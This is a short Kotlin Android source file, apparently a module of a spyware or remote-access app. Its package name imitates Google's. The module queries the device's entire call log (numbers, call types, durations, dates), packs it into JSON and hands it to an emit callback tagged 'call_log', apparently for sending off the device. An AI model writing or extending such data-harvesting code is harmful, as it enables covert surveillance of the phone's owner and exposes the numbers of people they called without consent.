package com.google.xmodzz

import android.content.Context
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

object CallRechive {
    fun sendAllCalls(ctx: Context, emit: (JSONObject) -> Unit) {
        val l = JSONArray()
        val c = ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI, 
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE), 
            null, 
            null, 
            "${CallLog.Calls.DATE} DESC" // URUTKAN DARI TERBARU
        )
        
        c?.use { 
            while (it.moveToNext()) {
                l.put(JSONObject()
                    .put("number", it.getString(0) ?: "")
                    .put("type", it.getInt(1))
                    .put("duration", it.getInt(2))
                    .put("date", it.getLong(3))
                )
            } 
        }
        
        emit(JSONObject().put("action", "call_log").put("data", l))
    }
}
